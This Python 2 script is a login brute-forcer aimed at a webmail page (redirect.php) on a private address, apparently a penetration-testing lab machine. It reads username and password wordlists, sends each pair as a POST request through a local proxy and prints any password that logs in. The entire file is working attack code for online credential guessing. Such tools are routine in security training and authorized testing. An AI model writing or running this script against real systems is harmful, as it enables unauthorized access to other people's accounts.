import urllib3
import sys

import subprocess
from subprocess import CalledProcessError
import multiprocessing
from multiprocessing import Process

def check_resp(stream):# check if we are redirected back to the login prompt.
        if 'Unknown user or password incorrect.' in stream.data:
                return False
        else:
                return True


def guess(password,username):
        print '[*] trying credentials ....%s:%s....'%(username,password)
        data="login_username=%s&secretkey=%s&js_autodetect_results=1&just_logged_in=1"%(username,password)
        req=proxy_stream.request('POST','http://10.11.1.115/webmail/src/redirect.php',body=data)
        if check_resp(req):
                print '[+] Found Password!!!:::::===> %s'%password
                sys.exit()


Usage = "\nUsage: %s <password-list> <username-list>\n"%sys.argv[0]
if len(sys.argv) !=3:
	print Usage
	sys.exit()


pass_list=open(sys.argv[1],'r')
user_list=open(sys.argv[2],'r')

wc=0
wct=0
#get total words in list
for i in pass_list:
	wct+=1
pass_list.seek(0)


proxy_stream=urllib3.ProxyManager("http://127.0.0.1:8080/")

for username in user_list:
	print '[**] BruteForce with username:::%s:::'%username.strip()
	for password in pass_list:
		print '[*] Trying %s/%s password(s)'%(wc,wct) # display curr/total count
		guess(password.strip(),username.strip())
		wc+=1 #increment curr count
	pass_list.seek(0)



#stream=urllib3.PoolManager()


### 0x10w1eve1 ###
